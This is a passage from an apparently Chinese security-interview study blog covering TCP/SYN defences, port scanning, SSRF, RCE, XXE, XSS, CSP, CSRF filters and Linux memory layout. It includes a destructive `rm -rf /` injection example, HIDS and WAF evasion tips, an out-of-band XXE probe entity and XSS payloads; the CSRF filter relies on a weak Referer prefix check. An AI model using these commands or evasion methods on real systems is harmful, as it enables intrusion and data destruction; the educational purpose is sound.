<li><strong>解决方案</strong>：<ul>
<li><strong>SYN Cookie</strong>：服务器不分配资源，而是通过计算SYN包的序列号来验证后续的ACK包。</li>
<li><strong>防火墙过滤</strong>：限制来自特定IP的SYN包数量。</li>
</ul>
</li>
</ol>
<h3 id="SYN-反向探测的原理"><a href="#SYN-反向探测的原理" class="headerlink" title="SYN 反向探测的原理"></a>SYN 反向探测的原理</h3><p>SYN反向探测是一种检测SYN Flood攻击的方法。通过分析目标服务器的SYN-ACK包，判断是否存在异常流量。</p>
<h3 id="TCP-SYN-Cookie-的原理"><a href="#TCP-SYN-Cookie-的原理" class="headerlink" title="TCP SYN Cookie 的原理"></a>TCP SYN Cookie 的原理</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/357887244">https://zhuanlan.zhihu.com/p/357887244</a><br>SYN Cookie是一种防御SYN Flood的机制。服务器在收到SYN包时，不分配资源，而是计算一个Cookie值，并将其放入SYN-ACK包中。当客户端发送ACK包时，服务器验证Cookie值是否正确，从而判断请求是否合法。</p>
<h3 id="UDP端口探测的有效方式"><a href="#UDP端口探测的有效方式" class="headerlink" title="UDP端口探测的有效方式"></a>UDP端口探测的有效方式</h3><ol>
<li><strong>使用 <code>nc</code> (netcat) 工具</strong>：<ul>
<li>通过发送 UDP 数据包来测试端口是否可达。例如：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> | nc -u serverB 123</span><br></pre></td></tr></table></figure>
这里 <code>-u</code> 表示使用 UDP 协议。</li>
</ul>
</li>
<li><strong>使用 <code>socat</code> 工具</strong>：<ul>
<li>发送 UDP 数据包测试端口：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> | socat - udp4:serverB:123</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>使用 <code>dig</code> 工具</strong>：<ul>
<li>测试 DNS 服务（通常使用 UDP 端口 53）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @serverB example.com</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>编写脚本或程序</strong>：<ul>
<li>使用 Python 的 <code>socket</code> 模块发送 UDP 数据包：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">message = <span class="string">b&#x27;Hello, UDP!&#x27;</span></span><br><span class="line">sock.sendto(message, (<span class="string">&#x27;serverB&#x27;</span>, <span class="number">123</span>))</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Nmap的FIN扫描和空扫描"><a href="#Nmap的FIN扫描和空扫描" class="headerlink" title="Nmap的FIN扫描和空扫描"></a>Nmap的FIN扫描和空扫描</h3><ol>
<li><strong>FIN扫描</strong>：<ul>
<li>发送一个设置了 FIN 标志的 TCP 数据包。如果收到 RST 响应，则端口关闭；如果没有响应，则端口开放或被过滤。命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sF 192.168.1.1</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>空扫描</strong>：<ul>
<li>发送未设置任何标志的 TCP 数据包。如果收到 RST 响应，则端口关闭；如果没有响应，则端口开放或被过滤。命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sN 192.168.1.1</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="三次握手的序列号变化"><a href="#三次握手的序列号变化" class="headerlink" title="三次握手的序列号变化"></a>三次握手的序列号变化</h3><ol>
<li><strong>客户端发送 SYN</strong>：<ul>
<li>客户端随机生成一个初始序列号（ISN），发送到服务器。</li>
</ul>
</li>
<li><strong>服务器响应 SYN&#x2F;ACK</strong>：<ul>
<li>服务器收到 SYN 后，生成自己的初始序列号，并将客户端的 ISN 加 1 作为确认号。</li>
</ul>
</li>
<li><strong>客户端发送 ACK</strong>：<ul>
<li>客户端将服务器的 ISN 加 1 作为确认号，发送 ACK 给服务器，完成三次握手。</li>
</ul>
</li>
</ol>
<h3 id="Python的值类型和引用类型"><a href="#Python的值类型和引用类型" class="headerlink" title="Python的值类型和引用类型"></a>Python的值类型和引用类型</h3><ol>
<li><strong>值类型</strong>：<ul>
<li>包括整数、浮点数、布尔值、字符串等。它们是不可变的，赋值时会创建新的对象。</li>
</ul>
</li>
<li><strong>引用类型</strong>：<ul>
<li>包括列表、字典、集合等。它们是可变的，赋值时只是引用的传递。</li>
</ul>
</li>
</ol>
<h3 id="Python的list和dict线程安全吗"><a href="#Python的list和dict线程安全吗" class="headerlink" title="Python的list和dict线程安全吗"></a>Python的list和dict线程安全吗</h3><ol>
<li><strong>线程安全</strong>：<ul>
<li>Python 的 <code>list</code> 和 <code>dict</code> 不是线程安全的。在多线程环境下，对它们的并发操作可能导致数据不一致。</li>
</ul>
</li>
<li><strong>解决方法</strong>：<ul>
<li>使用锁（如 <code>threading.Lock</code>）来保护对共享资源的访问。</li>
</ul>
</li>
</ol>
<h3 id="结合实际的例子说说SSRF"><a href="#结合实际的例子说说SSRF" class="headerlink" title="结合实际的例子说说SSRF"></a>结合实际的例子说说SSRF</h3><ol>
<li><strong>SSRF（服务器端请求伪造）</strong>：<ul>
<li>攻击者通过服务器端的漏洞，诱导服务器向内部网络或外部网络发送请求。</li>
</ul>
</li>
<li><strong>示例</strong>：<ul>
<li>某网站的图片上传功能允许用户输入 URL 来加载图片。攻击者可以输入 <code>http://localhost:8080/admin</code>，导致服务器向本地的管理页面发送请求，从而获取敏感信息。</li>
</ul>
</li>
</ol>
<h3 id="结合实际的例子讲讲RCE"><a href="#结合实际的例子讲讲RCE" class="headerlink" title="结合实际的例子讲讲RCE"></a>结合实际的例子讲讲RCE</h3><ol>
<li><strong>RCE（远程代码执行）</strong>：<ul>
<li>攻击者通过漏洞在目标服务器上执行任意代码。</li>
</ul>
</li>
<li><strong>示例</strong>：<ul>
<li>某 Web 应用允许用户输入命令来执行某些操作。如果输入未经过滤，攻击者可以输入 <code>os.system(&#39;rm -rf /&#39;)</code>，导致服务器删除所有文件。</li>
</ul>
</li>
</ol>
<h3 id="为什么现在文件上传很少了"><a href="#为什么现在文件上传很少了" class="headerlink" title="为什么现在文件上传很少了"></a>为什么现在文件上传很少了</h3><ol>
<li><strong>安全风险</strong>：<ul>
<li>文件上传功能容易被利用来上传恶意文件（如 Webshell），从而控制服务器。</li>
</ul>
</li>
<li><strong>替代方案</strong>：<ul>
<li>使用 API 或云存储服务来处理文件，减少直接上传的风险。</li>
</ul>
</li>
</ol>
<h3 id="基于语义分析的WAF了解吗"><a href="#基于语义分析的WAF了解吗" class="headerlink" title="基于语义分析的WAF了解吗"></a>基于语义分析的WAF了解吗</h3><ol>
<li><strong>语义分析</strong>：<ul>
<li>基于语义分析的 WAF 通过分析请求的语义，识别潜在的攻击。例如，通过解析 SQL 查询的结构，判断是否为 SQL 注入。</li>
</ul>
</li>
<li><strong>优势</strong>：<ul>
<li>能够更准确地识别复杂攻击，减少误报。</li>
</ul>
</li>
<li><strong>示例</strong>：<ul>
<li>某 WAF 通过解析 SQL 查询，发现请求中包含 <code>UNION SELECT</code>，判断为 SQL 注入攻击。</li>
</ul>
</li>
</ol>
<h3 id="Java的Class文件结构"><a href="#Java的Class文件结构" class="headerlink" title="Java的Class文件结构"></a>Java的Class文件结构</h3><p>Java的Class文件是一种二进制文件，用于存储Java程序的编译结果。它由多个部分组成，包括魔数、常量池、访问标记、类索引、父类索引、接口索引、字段表、方法表等。以下是Class文件的主要结构：</p>
<ol>
<li><strong>魔数</strong>：Class文件的开头是魔数<code>cafebabe</code>，这是JVM识别Class文件的标志。</li>
<li><strong>常量池</strong>：存储类中使用的常量信息，包括字符串、类名、方法名等。常量池的结构如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONSTANT_Utf8_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 length;</span><br><span class="line">    u1 bytes[length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>访问标记</strong>：描述类的访问权限，如<code>public</code>、<code>final</code>等。</li>
<li><strong>类索引、父类索引和接口索引</strong>：描述类的继承关系。</li>
<li><strong>字段表</strong>：存储类的字段信息，包括字段名、类型、访问权限等。</li>
<li><strong>方法表</strong>：存储类的方法信息，包括方法名、参数、返回值等。</li>
</ol>
<h3 id="CSP是如何防御XSS的"><a href="#CSP是如何防御XSS的" class="headerlink" title="CSP是如何防御XSS的"></a>CSP是如何防御XSS的</h3><p>内容安全策略（CSP）是一种安全机制，用于防止XSS攻击。其工作原理如下：</p>
<ol>
<li><strong>策略定义</strong>：通过HTTP响应头定义CSP策略，限制资源的加载来源。</li>
<li><strong>指令使用</strong>：使用指令如<code>default-src</code>、<code>script-src</code>等，指定允许加载的资源类型和来源。</li>
<li><strong>报告机制</strong>：通过<code>report-uri</code>指令，将违反策略的事件发送到指定的报告服务器。</li>
</ol>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://trusted.cdn.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="腾讯"><a href="#腾讯" class="headerlink" title="腾讯"></a>腾讯</h2><h3 id="1-企业有HIDS的情况下怎么攻击"><a href="#1-企业有HIDS的情况下怎么攻击" class="headerlink" title="1. 企业有HIDS的情况下怎么攻击"></a>1. 企业有HIDS的情况下怎么攻击</h3><ul>
<li><strong>无文件攻击</strong>：利用内存中的恶意脚本或工具（如PowerShell）执行攻击，避免在磁盘上留下痕迹，从而绕过HIDS的文件监控。</li>
<li><strong>混淆技术</strong>：对恶意代码进行混淆，使其难以被HIDS的签名检测识别。例如，通过加密或编码技术隐藏恶意代码。</li>
<li><strong>利用合法工具</strong>：使用企业内部合法的工具（如管理工具）进行攻击，这些工具通常不会被HIDS标记为恶意。</li>
<li><strong>低频率攻击</strong>：通过低频率的攻击行为减少HIDS的警报触发，例如分阶段执行攻击步骤。</li>
</ul>
<h3 id="2-企业要怎么做敏感数据泄露的防护"><a href="#2-企业要怎么做敏感数据泄露的防护" class="headerlink" title="2. 企业要怎么做敏感数据泄露的防护"></a>2. 企业要怎么做敏感数据泄露的防护</h3><ul>
<li><strong>数据加密</strong>：对敏感数据进行加密，确保即使数据被窃取也无法被解读。使用强加密算法如AES-256。</li>
<li><strong>访问控制</strong>：实施最小权限原则，仅授予员工完成工作所需的最低权限，并定期审查权限设置。</li>
<li><strong>部署DLP系统</strong>：实时监控数据流动，识别并阻止未经授权的数据传输行为。</li>
<li><strong>多因素身份验证（MFA）</strong>：在重要系统和高权限账户上启用MFA，增强账户安全性。</li>
<li><strong>员工培训</strong>：定期开展安全培训，提高员工对数据泄露威胁的识别能力。</li>
</ul>
<h3 id="3-聊HW中的绕过或技巧性强的经历"><a href="#3-聊HW中的绕过或技巧性强的经历" class="headerlink" title="3. 聊HW中的绕过或技巧性强的经历"></a>3. 聊HW中的绕过或技巧性强的经历</h3><ul>
<li><strong>WAF绕过</strong>：通过分割攻击、关键字混淆（如大小写混淆、分词法）或使用合法字符替代恶意字符来绕过WAF检测。</li>
<li><strong>协议伪装</strong>：将恶意流量封装在看似正常的协议（如HTTP）中，绕过防火墙的限制。</li>
<li><strong>流量分片</strong>：使用工具如<code>Scapy</code>将恶意数据包分片，使防火墙或IDS&#x2F;IPS难以重组和检测完整的恶意流量。</li>
</ul>
<h3 id="4-TCP拥塞控制和慢启动"><a href="#4-TCP拥塞控制和慢启动" class="headerlink" title="4. TCP拥塞控制和慢启动"></a>4. TCP拥塞控制和慢启动</h3><ul>
<li><strong>慢启动</strong>：在TCP连接建立初期，发送方逐渐增加发送窗口的大小，直到达到网络的拥塞阈值。通过这种方式，发送方可以探测网络的可用带宽。</li>
<li><strong>拥塞控制</strong>：当检测到网络拥塞（如丢包）时，发送方会减小发送窗口，降低发送速率，以避免进一步的拥塞。常用的拥塞控制算法包括Reno和Cubic。</li>
</ul>
<h3 id="5-谷歌语法：怎么收集子域名"><a href="#5-谷歌语法：怎么收集子域名" class="headerlink" title="5. 谷歌语法：怎么收集子域名"></a>5. 谷歌语法：怎么收集子域名</h3><ul>
<li>使用<code>site:</code>语法：例如<code>site:example.com</code>，可以列出example.com的所有子域名。</li>
<li>使用<code>inurl:</code>语法：例如<code>inurl:example.com</code>，可以查找包含example.com的URL。</li>
<li>使用<code>intext:</code>语法：例如<code>intext:example.com</code>，可以查找包含example.com的文本内容。</li>
</ul>
<h3 id="6-谷歌语法：识别指纹的时候，如何搜索路径"><a href="#6-谷歌语法：识别指纹的时候，如何搜索路径" class="headerlink" title="6. 谷歌语法：识别指纹的时候，如何搜索路径"></a>6. 谷歌语法：识别指纹的时候，如何搜索路径</h3><ul>
<li>使用<code>inurl:</code>语法：例如<code>inurl:/admin</code>，可以查找包含<code>/admin</code>路径的URL。</li>
<li>使用<code>intext:</code>语法：例如<code>intext:login</code>，可以查找包含<code>login</code>的文本内容。</li>
</ul>
<h3 id="7-谷歌语法：如何搜索前端源码的指纹"><a href="#7-谷歌语法：如何搜索前端源码的指纹" class="headerlink" title="7. 谷歌语法：如何搜索前端源码的指纹"></a>7. 谷歌语法：如何搜索前端源码的指纹</h3><ul>
<li>使用<code>site:</code>和<code>inurl:</code>组合：例如<code>site:example.com inurl:js</code>，可以查找example.com的JavaScript文件。</li>
<li>使用<code>intext:</code>语法：例如<code>intext:jQuery</code>，可以查找包含<code>jQuery</code>的文本内容。</li>
</ul>
<h3 id="8-怎么通过IP反查域名"><a href="#8-怎么通过IP反查域名" class="headerlink" title="8. 怎么通过IP反查域名"></a>8. 怎么通过IP反查域名</h3><ul>
<li>使用在线工具：如<code>MXToolbox</code>或<code>DNS Lookup</code>工具。</li>
<li>使用命令行工具：如<code>nslookup</code>或<code>dig</code>，例如<code>nslookup 1.2.3.4</code>。</li>
</ul>
<h3 id="9-信息收集中子域名的收集手段"><a href="#9-信息收集中子域名的收集手段" class="headerlink" title="9. 信息收集中子域名的收集手段"></a>9. 信息收集中子域名的收集手段</h3><ul>
<li>使用子域名枚举工具：如<code>Sublist3r</code>、<code>Amass</code>等。</li>
<li>利用搜索引擎：使用谷歌语法（如<code>site:example.com</code>）。</li>
<li>利用DNS查询工具：如<code>dig</code>或<code>nslookup</code>，查询子域名记录。</li>
</ul>
<h3 id="CSRF-防御"><a href="#CSRF-防御" class="headerlink" title="CSRF 防御"></a>CSRF 防御</h3><ul>
<li><strong>Referer 验证</strong>：通过检查 HTTP 请求头中的 <code>Referer</code> 字段来判断请求是否来自合法的来源。</li>
<li><strong>Referer 为空的防御</strong>：如果 <code>Referer</code> 为空，可能是浏览器特性导致，也可能是攻击者故意构造的请求。在这种情况下，可以结合其他防御机制来判断请求的合法性。</li>
</ul>
<h3 id="XXE-无回显探测"><a href="#XXE-无回显探测" class="headerlink" title="XXE 无回显探测"></a>XXE 无回显探测</h3><ul>
<li><strong>DNS 验证</strong>：通过构造包含特定域名的外部实体，利用 DNS 查询来判断是否存在 XXE 漏洞。</li>
<li><strong>内部实体探测</strong>：通过探测内部实体的解析情况，判断是否存在 XXE 漏洞。</li>
</ul>
<h3 id="XSS-硬编码利用"><a href="#XSS-硬编码利用" class="headerlink" title="XSS 硬编码利用"></a>XSS 硬编码利用</h3><ul>
<li><strong>前端 DOM 型</strong>：通过 JavaScript 代码转义特殊编码，如 <code>\u003c</code>，来执行恶意代码。</li>
<li><strong>HTML 中的特殊编码执行</strong>：在 HTML 中，如果具备某种标签的特性，可以导致特殊编码执行，从而实现 XSS 攻击。</li>
</ul>
<h3 id="CSRF-防御代码示例"><a href="#CSRF-防御代码示例" class="headerlink" title="CSRF 防御代码示例"></a>CSRF 防御代码示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CsrfFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">httpRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        <span class="type">String</span> <span class="variable">referer</span> <span class="operator">=</span> httpRequest.getHeader(<span class="string">&quot;Referer&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (referer != <span class="literal">null</span> &amp;&amp; referer.startsWith(<span class="string">&quot;http://yourdomain.com&quot;</span>)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// CSRF 检测失败，处理逻辑</span></span><br><span class="line">            ((HttpServletResponse) response).sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;CSRF attack detected&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="XXE-无回显探测代码示例"><a href="#XXE-无回显探测代码示例" class="headerlink" title="XXE 无回显探测代码示例"></a>XXE 无回显探测代码示例</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://yourdomain.com/xxe-test&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSS-硬编码利用代码示例"><a href="#XSS-硬编码利用代码示例" class="headerlink" title="XSS 硬编码利用代码示例"></a>XSS 硬编码利用代码示例</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> userInput = <span class="string">&quot;\u003cscript\u003ealert(&#x27;XSS&#x27;)\u003c/script\u003e&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(userInput);</span><br></pre></td></tr></table></figure>

<h3 id="XSS-转义特殊编码执行代码示例"><a href="#XSS-转义特殊编码执行代码示例" class="headerlink" title="XSS 转义特殊编码执行代码示例"></a>XSS 转义特殊编码执行代码示例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> userInput = <span class="string">&quot;\u003cscript\u003ealert(&#x27;XSS&#x27;)\u003c/script\u003e&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(userInput);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="1-Linux程序的内存布局"><a href="#1-Linux程序的内存布局" class="headerlink" title="1. Linux程序的内存布局"></a>1. Linux程序的内存布局</h3><p>Linux程序在运行时，其内存布局通常分为以下几个段：</p>
<ul>
<li><strong>代码段（.text）</strong>：存放程序的可执行代码。</li>
<li><strong>数据段（.data）</strong>：存放已初始化的全局变量和静态变量。</li>
<li><strong>未初始化数据段（.bss）</strong>：存放未初始化的全局变量和静态变量。</li>
<li><strong>堆（Heap）</strong>：动态内存分配区域，由<code>malloc</code>、<code>calloc</code>等函数管理。</li>
<li><strong>栈（Stack）</strong>：存放函数调用时的局部变量和返回地址等。</li>
</ul>
<h4 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量，存放在.data段</span></span><br><span class="line"><span class="type">int</span> global_initialized = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 未初始化的全局变量，存放在.bss段</span></span><br><span class="line"><span class="type">int</span> global_uninitialized;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">example_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 局部变量，存放在栈中</span></span><br><span class="line">    <span class="type">int</span> stack_variable = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack variable: %d\n&quot;</span>, stack_variable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    example_function();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 动态分配的内存，存放在堆中</span></span><br><span class="line">    <span class="type">int</span> *heap_variable = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    *heap_variable = <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Heap variable: %d\n&quot;</span>, *heap_variable);</span><br><span class="line">    <span class="built_in">free</span>(heap_variable);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-data段和-bss段存放的数据"><a href="#2-data段和-bss段存放的数据" class="headerlink" title="2. .data段和.bss段存放的数据"></a>2. .data段和.bss段存放的数据</h3><ul>
<li><strong>.data段</strong>：存放已初始化的全局变量和静态变量。</li>
<li><strong>.bss段</strong>：存放未初始化的全局变量和静态变量。</li>
</ul>
<h4 id="示例代码：-1"><a href="#示例代码：-1" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .data段</span></span><br><span class="line"><span class="type">int</span> initialized_global = <span class="number">10</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> initialized_static = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .bss段</span></span><br><span class="line"><span class="type">int</span> uninitialized_global;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> uninitialized_static;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// .data段的变量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initialized global: %d\n&quot;</span>, initialized_global);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initialized static: %d\n&quot;</span>, initialized_static);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// .bss段的变量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Uninitialized global: %d\n&quot;</span>, uninitialized_global);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Uninitialized static: %d\n&quot;</span>, uninitialized_static);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-函数调用时的流程、参数传递、寄存器和栈的变化"><a href="#3-函数调用时的流程、参数传递、寄存器和栈的变化" class="headerlink" title="3. 函数调用时的流程、参数传递、寄存器和栈的变化"></a>3. 函数调用时的流程、参数传递、寄存器和栈的变化</h3><p>函数调用时的流程通常包括以下几个步骤：</p>
<ol>
<li><strong>参数传递</strong>：参数通过寄存器或栈传递。</li>
<li><strong>保存返回地址</strong>：将返回地址存入栈中。</li>
<li><strong>创建栈帧</strong>：为局部变量分配栈空间。</li>
<li><strong>执行函数体</strong>：执行函数逻辑。</li>
<li><strong>销毁栈帧</strong>：释放栈空间。</li>
<li><strong>返回结果</strong>：将结果存入寄存器或栈中。</li>
</ol>
<h4 id="示例代码：-2"><a href="#示例代码：-2" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">example_function</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> local_variable = a + b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %d\n&quot;</span>, local_variable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    example_function(<span class="number">5</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="汇编代码（x86-64）："><a href="#汇编代码（x86-64）：" class="headerlink" title="汇编代码（x86_64）："></a>汇编代码（x86_64）：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">; main函数</span><br><span class="line">main:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    sub rsp, 16</span><br><span class="line">    mov dword [rbp-4], 5</span><br><span class="line">    mov dword [rbp-8], 3</span><br><span class="line">    mov eax, dword [rbp-4]</span><br><span class="line">    mov edx, dword [rbp-8]</span><br><span class="line">    mov esi, edx</span><br><span class="line">    mov edi, eax</span><br><span class="line">    call example_function</span><br><span class="line">    mov eax, 0</span><br><span class="line">    leave</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">; example_function函数</span><br><span class="line">example_function:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    sub rsp, 16</span><br><span class="line">    mov dword [rbp-4], edi</span><br><span class="line">    mov dword [rbp-8], esi</span><br><span class="line">    mov eax, dword [rbp-4]</span><br><span class="line">    add eax, dword [rbp-8]</span><br><span class="line">    mov dword [rbp-12], eax</span><br><span class="line">    mov 